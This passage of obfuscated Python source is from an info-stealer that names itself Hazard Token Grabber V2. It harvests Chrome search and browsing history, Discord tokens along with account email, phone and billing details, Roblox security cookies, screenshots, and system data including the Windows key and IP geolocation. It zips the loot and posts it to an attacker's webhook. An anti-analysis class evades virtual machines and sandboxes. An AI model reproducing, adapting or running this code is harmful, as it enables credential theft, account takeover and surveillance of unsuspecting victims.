                        OO0OO0OOO0OO0O000 .robloxcookies .append (O00O00O000O0O0000 )#line:467
                O00O00OO00O0OO0O0 .close ()#line:469
                OO0000OO0000O000O .close ()#line:470
                os .remove (OO000OOO00O00OO00 )#line:471
        OO00O000O0OOO000O .close ()#line:472
    @try_extract #line:474
    def grabHistory (O0OOO00O000OOOOO0 ):#line:475
        O000O0O00OOOOOOO0 =open (O0OOO00O000OOOOO0 .dir +'\\Google History.txt','w',encoding ="cp437",errors ='ignore')#line:476
        def OOO0000OOOOOO0000 (OO0OOOOOO000O0O0O ):#line:478
            OO0OOOOOO000O0O0O .execute ('SELECT term FROM keyword_search_terms')#line:479
            O0OO00O0OOO0OO00O =""#line:480
            for OOO0OOO0O0O00O000 in OO0OOOOOO000O0O0O .fetchall ():#line:481
                if OOO0OOO0O0O00O000 [0 ]!="":#line:482
                    O0OO00O0OOO0OO00O +=f"{OOO0OOO0O0O00O000[0]}\n"#line:483
            return O0OO00O0OOO0OO00O #line:484
        def O000OOO00O0O000O0 (O0000000000OOO000 ):#line:486
            OO00OOO00O0O0O00O =""#line:487
            O0000000000OOO000 .execute ('SELECT title, url, last_visit_time FROM urls')#line:488
            for OO0000000OOOO0O00 in O0000000000OOO000 .fetchall ():#line:489
                OO00OOO00O0O0O00O +=f"Title: {OO0000000OOOO0O00[0]}\nUrl: {OO0000000OOOO0O00[1]}\nLast Time Visit: {O0OOO00O000OOOOO0.convert_time(OO0000000OOOO0O00[2]).strftime('%Y/%m/%d - %H:%M:%S')}\n\n"#line:490
            return OO00OOO00O0O0O00O #line:491
        for OOO0OO0OO00O00000 in os .listdir (O0OOO00O000OOOOO0 .chrome ):#line:493
            if re .match (O0OOO00O000OOOOO0 .chrome_reg ,OOO0OO0OO00O00000 ):#line:494
                OO0OOO0OO0O0O0OOO =ntpath .join (O0OOO00O000OOOOO0 .chrome ,OOO0OO0OO00O00000 ,'History')#line:495
                OO0OO000OO0O0OOOO =O0OOO00O000OOOOO0 .create_temp_file ()#line:496
                shutil .copy2 (OO0OOO0OO0O0O0OOO ,OO0OO000OO0O0OOOO )#line:498
                O00O0O0OO00O00O0O =sqlite3 .connect (OO0OO000OO0O0OOOO )#line:499
                OO000O0OO0O0O0O00 =O00O0O0OO00O00O0O .cursor ()#line:500
                O0O0OO0OOO0O0O0O0 =OOO0000OOOOOO0000 (OO000O0OO0O0O0O00 )#line:502
                O0OO0OOO0OOO00000 =O000OOO00O0O000O0 (OO000O0OO0O0O0O00 )#line:503
                O000O0O00OOOOOOO0 .write (f"{' '*17}Search History\n{'-'*50}\n{O0O0OO0OOO0O0O0O0}\n{' '*17}\n\nWeb History\n{'-'*50}\n{O0OO0OOO0OOO00000}")#line:505
                OO000O0OO0O0O0O00 .close ()#line:507
                O00O0O0OO00O00O0O .close ()#line:508
                os .remove (OO0OO000OO0O0OOOO )#line:509
        O000O0O00OOOOOOO0 .close ()#line:510
    def neatifyTokens (OO0OO0O00O00O000O ):#line:512
        OOO000O00OOO0O0O0 =open (OO0OO0O00O00O000O .dir +"\\Discord Info.txt","w",encoding ="cp437",errors ='ignore')#line:513
        for O000000O000000OO0 in OO0OO0O00O00O000O .tokens :#line:514
            OO0O0OO0O0O0OOOO0 =httpx .get (OO0OO0O00O00O000O .discordApi ,headers =OO0OO0O00O00O000O .get_headers (O000000O000000OO0 )).json ()#line:515
            O00O00O0O00000000 =OO0O0OO0O0O0OOOO0 .get ('username')+'#'+str (OO0O0OO0O0O0OOOO0 .get ("discriminator"))#line:516
            O0OOOOOOOOO0O0OOO =""#line:518
            OO00O0O0OOOOO0OOO =OO0O0OO0O0O0OOOO0 ['flags']#line:519
            if (OO00O0O0OOOOO0OOO ==1 ):#line:520
                O0OOOOOOOOO0O0OOO +="Staff, "#line:521
            if (OO00O0O0OOOOO0OOO ==2 ):#line:522
                O0OOOOOOOOO0O0OOO +="Partner, "#line:523
            if (OO00O0O0OOOOO0OOO ==4 ):#line:524
                O0OOOOOOOOO0O0OOO +="Hypesquad Event, "#line:525
            if (OO00O0O0OOOOO0OOO ==8 ):#line:526
                O0OOOOOOOOO0O0OOO +="Green Bughunter, "#line:527
            if (OO00O0O0OOOOO0OOO ==64 ):#line:528
                O0OOOOOOOOO0O0OOO +="Hypesquad Bravery, "#line:529
            if (OO00O0O0OOOOO0OOO ==128 ):#line:530
                O0OOOOOOOOO0O0OOO +="HypeSquad Brillance, "#line:531
            if (OO00O0O0OOOOO0OOO ==256 ):#line:532
                O0OOOOOOOOO0O0OOO +="HypeSquad Balance, "#line:533
            if (OO00O0O0OOOOO0OOO ==512 ):#line:534
                O0OOOOOOOOO0O0OOO +="Early Supporter, "#line:535
            if (OO00O0O0OOOOO0OOO ==16384 ):#line:536
                O0OOOOOOOOO0O0OOO +="Gold BugHunter, "#line:537
            if (OO00O0O0OOOOO0OOO ==131072 ):#line:538
                O0OOOOOOOOO0O0OOO +="Verified Bot Developer, "#line:539
            if (O0OOOOOOOOO0O0OOO ==""):#line:540
                O0OOOOOOOOO0O0OOO ="None"#line:541
            OOO000OOOOOO00O0O =OO0O0OO0O0O0OOOO0 .get ("email")#line:543
            O0O00000000OOOO00 =OO0O0OO0O0O0OOOO0 .get ("phone")if OO0O0OO0O0O0OOOO0 .get ("phone")else "No Phone Number attached"#line:544
            O0OOOO00OOOO0O00O =httpx .get (OO0OO0O00O00O000O .discordApi +'/billing/subscriptions',headers =OO0OO0O00O00O000O .get_headers (O000000O000000OO0 )).json ()#line:545
            OO00O00O00O00OOO0 =False #line:546
            OO00O00O00O00OOO0 =bool (len (O0OOOO00OOOO0O00O )>0 )#line:547
            OOOOOO0OOO0O0OOO0 =bool (len (json .loads (httpx .get (OO0OO0O00O00O000O .discordApi +"/billing/payment-sources",headers =OO0OO0O00O00O000O .get_headers (O000000O000000OO0 )).text ))>0 )#line:548
            OOO000O00OOO0O0O0 .write (f"{' '*17}{O00O00O0O00000000}\n{'-'*50}\nToken: {O000000O000000OO0}\nHas Billing: {OOOOOO0OOO0O0OOO0}\nNitro: {OO00O00O00O00OOO0}\nBadges: {O0OOOOOOOOO0O0OOO}\nEmail: {OOO000OOOOOO00O0O}\nPhone: {O0O00000000OOOO00}\n\n")#line:549
        OOO000O00OOO0O0O0 .close ()#line:550
    def grabRobloxCookie (O0OO00O00OO000O00 ):#line:552
        def O00OOOO0O00000O00 (OO0O0OO0O0O0OO0O0 ):#line:553
            try :#line:554
                return subprocess .check_output (fr"powershell Get-ItemPropertyValue -Path {OO0O0OO0O0O0OO0O0}:SOFTWARE\Roblox\RobloxStudioBrowser\roblox.com -Name .ROBLOSECURITY",creationflags =0x08000000 ).decode ().rstrip ()#line:557
            except Exception :#line:558
                return None #line:559
        OO0OOOO0OO000O0O0 =O00OOOO0O00000O00 (r'HKLM')#line:560
        if not OO0OOOO0OO000O0O0 :#line:561
            OO0OOOO0OO000O0O0 =O00OOOO0O00000O00 (r'HKCU')#line:562
        if OO0OOOO0OO000O0O0 :#line:563
            O0OO00O00OO000O00 .robloxcookies .append (OO0OOOO0OO000O0O0 )#line:564
        if O0OO00O00OO000O00 .robloxcookies :#line:565
            with open (O0OO00O00OO000O00 .dir +"\\Roblox Cookies.txt","w")as OOOO0OO0OOOO00O0O :#line:566
                for OO000O000000O0OOO in O0OO00O00OO000O00 .robloxcookies :#line:567
                    OOOO0OO0OOOO00O0O .write (OO000O000000O0OOO +'\n')#line:568
    def screenshot (OOO0O00O0OO000O00 ):#line:570
        OO00O0OO00OOO0OO0 =ImageGrab .grab (bbox =None ,include_layered_windows =False ,all_screens =True ,xdisplay =None )#line:576
        OO00O0OO00OOO0OO0 .save (OOO0O00O0OO000O00 .dir +"\\Screenshot.png")#line:577
        OO00O0OO00OOO0OO0 .close ()#line:578
    def sys_dump (O000OOOOO0O0OO000 ):#line:580
        OOOOOO00000O0O000 ="="*50 #line:581
        O0000000OO000OOO0 =f"""
{OOOOOO00000O0O000}
{Victim} | {Victim_pc}
{line_sep}
Windows key: {O000OOOOO0O0OO000.winkey}
Windows version: {O000OOOOO0O0OO000.winver}
{line_sep}
RAM: {ram}GB
DISK: {disk}GB
HWID: {O000OOOOO0O0OO000.hwid}
{line_sep}
IP: {O000OOOOO0O0OO000.ip}
City: {O000OOOOO0O0OO000.city}
Country: {O000OOOOO0O0OO000.country}
Region: {O000OOOOO0O0OO000.region}
Org: {O000OOOOO0O0OO000.org}
GoogleMaps: {O000OOOOO0O0OO000.googlemap}
{line_sep}
        """#line:600
        with open (O000OOOOO0O0OO000 .dir +"\\System info.txt","w",encoding ="utf-8",errors ='ignore')as OO0O000OO0OO0O0O0 :#line:601
            OO0O000OO0OO0O0O0 .write (O0000000OO000OOO0 )#line:602
    def finish (O0OO00OO0OO0OOO0O ):#line:604
        for OOOOOO0O000O00O00 in os .listdir (O0OO00OO0OO0OOO0O .dir ):#line:605
            if OOOOOO0O000O00O00 .endswith ('.txt'):#line:606
                OO0OOOO00OO00000O =O0OO00OO0OO0OOO0O .dir +O0OO00OO0OO0OOO0O .sep +OOOOOO0O000O00O00 #line:607
                with open (OO0OOOO00OO00000O ,"r",errors ="ignore")as O0OOO00O00OO0OO0O :#line:608
                    OO0OOO000000OOOOO =O0OOO00O00OO0OO0O .read ()#line:609
                    if not OO0OOO000000OOOOO :#line:610
                        O0OOO00O00OO0OO0O .close ()#line:611
                        os .remove (OO0OOOO00OO00000O )#line:612
                    else :#line:613
                        with open (OO0OOOO00OO00000O ,"w",encoding ="utf-8",errors ="ignore")as O00O0O0OOO0OO00O0 :#line:614
                            O00O0O0OOO0OO00O0 .write ("🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2\n\n")#line:615
                        with open (OO0OOOO00OO00000O ,"a",encoding ="utf-8",errors ="ignore")as O00OO00OOO000O0OO :#line:616
                            O00OO00OOO000O0OO .write (OO0OOO000000OOOOO +"\n\n🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2")#line:617
        _O00OOOO00O0O00O0O =ntpath .join (O0OO00OO0OO0OOO0O .appdata ,f'Hazard.V2-[{Victim}].zip')#line:619
        O0OO00O0O000O0000 =zipfile .ZipFile (_O00OOOO00O0O00O0O ,"w",zipfile .ZIP_DEFLATED )#line:620
        O00O00OO0O0OOO000 =ntpath .abspath (O0OO00OO0OO0OOO0O .dir )#line:621
        for OOO000O0OOO00O000 ,_OO0O00O0O0O0000OO ,OO00O00OOOOO00000 in os .walk (O0OO00OO0OO0OOO0O .dir ):#line:622
            for O0000O0O00OOOO0OO in OO00O00OOOOO00000 :#line:623
                OO00O0OOO0OOOOOOO =ntpath .abspath (ntpath .join (OOO000O0OOO00O000 ,O0000O0O00OOOO0OO ))#line:624
                O0000O00O0OOO0O00 =OO00O0OOO0OOOOOOO [len (O00O00OO0O0OOO000 )+1 :]#line:625
                O0OO00O0O000O0000 .write (OO00O0OOO0OOOOOOO ,O0000O00O0OOO0O00 )#line:626
        O0OO00O0O000O0000 .close ()#line:627
        OO00O0O00OOOOOO00 =''#line:629
        for O00O0O0OOO0OO00O0 in os .listdir (O0OO00OO0OO0OOO0O .dir ):#line:630
            OO00O0O00OOOOOO00 +=f"・{O00O0O0OOO0OO00O0}\n"#line:631
        O0OOOOOOOOO000O0O =''#line:632
        for OO000000O0O00OO0O in O0OO00OO0OO0OOO0O .tokens :#line:633
            O0OOOOOOOOO000O0O +=f'{OO000000O0O00OO0O}\n\n'#line:634
        O0OOO0OO0O000OOOO =f"{len(OO00O00OOOOO00000)} Files Found: "#line:635
        O0OO0O00000OO0OOO ={'avatar_url':'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Big_hazard.gif','embeds':[{'author':{'name':f'*{Victim}* Just ran Hazard Token Grabber.V2','url':'https://github.com/Rdimo/Hazard-Token-Grabber-V2','icon_url':'https://raw.githubusercontent.com/Rdimo/images/master/Hazard-Token-Grabber-V2/Small_hazard.gif'},'color':176185 ,'description':f'[Google Maps Location]({O0OO00OO0OO0OOO0O.googlemap})','fields':[{'name':'\u200b','value':f'''```fix
                                IP:᠎ {O0OO00OO0OO0OOO0O.ip.replace(" ", "᠎ ") if O0OO00OO0OO0OOO0O.ip else "N/A"}
                                Org:᠎ {O0OO00OO0OO0OOO0O.org.replace(" ", "᠎ ") if O0OO00OO0OO0OOO0O.org else "N/A"}
                                City:᠎ {O0OO00OO0OO0OOO0O.city.replace(" ", "᠎ ") if O0OO00OO0OO0OOO0O.city else "N/A"}
                                Region:᠎ {O0OO00OO0OO0OOO0O.region.replace(" ", "᠎ ") if O0OO00OO0OO0OOO0O.region else "N/A"}
                                Country:᠎ {O0OO00OO0OO0OOO0O.country.replace(" ", "᠎ ") if O0OO00OO0OO0OOO0O.country else "N/A"}```
                            '''.replace (' ',''),'inline':True },{'name':'\u200b','value':f'''```fix
                                PCName: {Victim_pc.replace(" ", "᠎ ")}
                                WinKey:᠎ {O0OO00OO0OO0OOO0O.winkey.replace(" ", "᠎ ")}
                                WinVer:᠎ {O0OO00OO0OO0OOO0O.winver.replace(" ", "᠎ ")}
                                DiskSpace:᠎ {disk}GB
                                Ram:᠎ {ram}GB```
                            '''.replace (' ',''),'inline':True },{'name':'**Tokens:**','value':f'''```yaml
                                {O0OOOOOOOOO000O0O if O0OOOOOOOOO000O0O else "No tokens extracted"}```
                            '''.replace (' ',''),'inline':False },{'name':O0OOO0OO0O000OOOO ,'value':f'''```ini
                                [
                                {OO00O0O00OOOOOO00.strip()}
                                ]```
                            '''.replace (' ',''),'inline':False }],'footer':{'text':'🌟・Grabber By github.com/Rdimo・https://github.com/Rdimo/Hazard-Token-Grabber-V2'}}]}#line:693
        if O0OO00OO0OO0OOO0O .fetch_conf ('ping_on_run'):#line:694
            O0OO0O00000OO0OOO .update ({'content':'@everyone'})#line:695
        with open (_O00OOOO00O0O00O0O ,'rb')as O00O0O0OOO0OO00O0 :#line:697
            if O0OO00OO0OO0OOO0O .hook_reg in O0OO00OO0OO0OOO0O .webhook :#line:698
                httpx .post (O0OO00OO0OO0OOO0O .webhook ,json =O0OO0O00000OO0OOO )#line:699
                httpx .post (O0OO00OO0OO0OOO0O .webhook ,files ={'upload_file':O00O0O0OOO0OO00O0 })#line:700
            else :#line:701
                from pyotp import TOTP #line:702
                O0O00OO0O0OOO00OO =TOTP (O0OO00OO0OO0OOO0O .fetch_conf ('webhook_protector_key')).now ()#line:703
                httpx .post (O0OO00OO0OO0OOO0O .webhook ,headers ={"Authorization":O0O00OO0O0OOO00OO },json =O0OO0O00000OO0OOO )#line:704
                httpx .post (O0OO00OO0OO0OOO0O .webhook ,headers ={"Authorization":O0O00OO0O0OOO00OO },files ={'upload_file':O00O0O0OOO0OO00O0 })#line:705
        os .remove (_O00OOOO00O0O00O0O )#line:706
        shutil .rmtree (O0OO00OO0OO0OOO0O .dir ,ignore_errors =True )#line:707
class AntiDebug (Functions ):#line:710
    inVM =False #line:711
    def __init__ (OO00O0OOOOOO0000O ):#line:713
        OO00O0OOOOOO0000O .processes =list ()#line:714
        OO00O0OOOOOO0000O .blackListedUsers =["WDAGUtilityAccount","Abby","Peter Wilson","hmarc","patex","JOHN-PC","RDhJ0CNFevzX","kEecfMwgj","Frank","8Nl0ColNQ5bq","Lisa","John","george","PxmdUOpVyx","8VizSM","w0fjuOVmCcP5A","lmVwjj9b","PqONjHVwexsS","3u2v9m8","Julia","HEUeRzl",]#line:719
        OO00O0OOOOOO0000O .blackListedPCNames =["BEE7370C-8C0C-4","DESKTOP-NAKFFMT","WIN-5E07COS9ALR","B30F0242-1C6A-4","DESKTOP-VRSQLAG","Q9IATRKPRH","XC64ZB","DESKTOP-D019GDM","DESKTOP-WI8CLET","SERVER1","LISA-PC","JOHN-PC","DESKTOP-B0T93D6","DESKTOP-1PYKP29","DESKTOP-1Y2433R","WILEYPC","WORK","6C4E733F-C2D9-4","RALPHS-PC","DESKTOP-WG3MYJS","DESKTOP-7XC6GEZ","DESKTOP-5OV9S0O","QarZhrdBpj","ORELEEPC","ARCHIBALDPC","JULIA-PC","d1bnJkfVlH",]#line:724
        OO00O0OOOOOO0000O .blackListedHWIDS =["7AB5C494-39F5-4941-9163-47F54D6D5016","032E02B4-0499-05C3-0806-3C0700080009","03DE0294-0480-05DE-1A06-350700080009","11111111-2222-3333-4444-555555555555","6F3CA5EC-BEC9-4A4D-8274-11168F640058","ADEEEE9E-EF0A-6B84-B14B-B83A54AFC548","4C4C4544-0050-3710-8058-CAC04F59344A","00000000-0000-0000-0000-AC1F6BD04972","79AF5279-16CF-4094-9758-F88A616D81B4","5BD24D56-789F-8468-7CDC-CAA7222CC121","49434D53-0200-9065-2500-65902500E439","49434D53-0200-9036-2500-36902500F022","777D84B3-88D1-451C-93E4-D235177420A7","49434D53-0200-9036-2500-369025000C65","B1112042-52E8-E25B-3655-6A4F54155DBF","00000000-0000-0000-0000-AC1F6BD048FE","EB16924B-FB6D-4FA1-8666-17B91F62FB37","A15A930C-8251-9645-AF63-E45AD728C20C","67E595EB-54AC-4FF0-B5E3-3DA7C7B547E3","C7D23342-A5D4-68A1-59AC-CF40F735B363","63203342-0EB0-AA1A-4DF5-3FB37DBB0670","44B94D56-65AB-DC02-86A0-98143A7423BF","6608003F-ECE4-494E-B07E-1C4615D1D93C","D9142042-8F51-5EFF-D5F8-EE9AE3D1602A","49434D53-0200-9036-2500-369025003AF0","8B4E8278-525C-7343-B825-280AEBCD3BCB","4D4DDC94-E06C-44F4-95FE-33A1ADA5AC27",]#line:735
        for O00000OOOOO0OO0OO in [OO00O0OOOOOO0000O .listCheck ,OO00O0OOOOOO0000O .registryCheck ,OO00O0OOOOOO0000O .specsCheck ]:#line:737
            OOOOO0000OOOOOO0O =threading .Thread (target =O00000OOOOO0OO0OO ,daemon =True )#line:738
            OO00O0OOOOOO0000O .processes .append (OOOOO0000OOOOOO0O )#line:739
            OOOOO0000OOOOOO0O .start ()#line:740
        for O0OOO00OO0OOOOOOO in OO00O0OOOOOO0000O .processes :#line:741
            try :#line:742
                O0OOO00OO0OOOOOOO .join ()#line:743
            except RuntimeError :#line:744
                continue #line:745
    def programExit (OO000000OOO0OO000 ):#line:747
        OO000000OOO0OO000 .__class__ .inVM =True #line:748
    def listCheck (OOOOO000OO0000OO0 ):#line:750
        for OOO000O0OOOOOO00O in [r'D:\Tools',r'D:\OS2',r'D:\NT3X']:#line:751
            if ntpath .exists (OOO000O0OOOOOO00O ):#line:752
                OOOOO000OO0000OO0 .programExit ()#line:753
        for OO0OOOO00O0OOO0O0 in OOOOO000OO0000OO0 .blackListedUsers :#line:755
            if Victim ==OO0OOOO00O0OOO0O0 :#line:756
                OOOOO000OO0000OO0 .programExit ()#line:757
        for O000OOOOO00O000OO in OOOOO000OO0000OO0 .blackListedPCNames :#line:759
            if Victim_pc ==O000OOOOO00O000OO :#line:760
                OOOOO000OO0000OO0 .programExit ()#line:761
        for O0OOO0000O00O00O0 in OOOOO000OO0000OO0 .blackListedHWIDS :#line:763
            if OOOOO000OO0000OO0 .system_info ()[0 ]==O0OOO0000O00O00O0 :#line:764
                OOOOO000OO0000OO0 .programExit ()#line:765
    def specsCheck (OO0O0OO00OOO000OO ):#line:767
        if int (ram )<=2 :#line:769
            OO0O0OO00OOO000OO .programExit ()#line:770
        if int (disk )<=50 :#line:771
            OO0O0OO00OOO000OO .programExit ()#line:772
        if int (psutil .cpu_count ())<=1 :#line:773
            OO0O0OO00OOO000OO .programExit ()#line:774
    def registryCheck (O0O0O00OOO00OOOOO ):#line:776
        OOOOOOOO0O00OO0O0 =os .system ("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\DriverDesc 2> nul")#line:777
        O0OOOO0OO0O0OO0O0 =os .system ("REG QUERY HKEY_LOCAL_MACHINE\\SYSTEM\\ControlSet001\\Control\\Class\\{4D36E968-E325-11CE-BFC1-08002BE10318}\\0000\\ProviderName 2> nul")#line:778
        if (OOOOOOOO0O00OO0O0 and O0OOOO0OO0O0OO0O0 )!=1 :#line:779
            O0O0O00OOO00OOOOO .programExit ()#line:780
        O0OOOO00O000OOOOO =winreg .OpenKey (winreg .HKEY_LOCAL_MACHINE ,'SYSTEM\\CurrentControlSet\\Services\\Disk\\Enum')#line:782
        try :#line:783
            O000OO000O0000O00 =winreg .QueryValueEx (O0OOOO00O000OOOOO ,'0')[0 ]#line:784
            if ("VMware"or "VBOX")in O000OO000O0000O00 :#line:785
                O0O0O00OOO00OOOOO .programExit ()#line:786
        finally :#line:787
            winreg .CloseKey (O0OOOO00O000OOOOO )#line:788
if __name__ =="__main__"and os .name =="nt":#line:791
    try :#line:792
        httpx .get ('https://google.com')#line:793
    except httpx .ConnectTimeout :#line:794
        os ._exit (0 )#line:795
    asyncio .run (HazardTokenGrabberV2 ().init ())#line:796
